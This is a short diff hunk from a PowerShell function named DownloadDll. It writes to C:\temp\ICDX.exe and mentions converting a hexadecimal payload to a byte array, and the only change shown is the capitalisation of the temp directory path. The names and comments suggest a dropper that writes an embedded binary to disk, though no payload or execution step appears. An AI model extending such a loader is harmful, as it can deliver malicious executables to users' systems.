@@ -3,8 +3,8 @@ function DownloadDll {
     $outFile = "C:\temp\ICDX.exe"
     
     # Ensure the directory exists
-    if (!(Test-Path -Path "C:\temp\")) {
-        New-Item -ItemType Directory -Path "C:\temp\"
+    if (!(Test-Path -Path "C:\Temp\")) {
+        New-Item -ItemType Directory -Path "C:\Temp\"
     }
     Write-output $payload
     # Convert the hexadecimal payload to a byte array
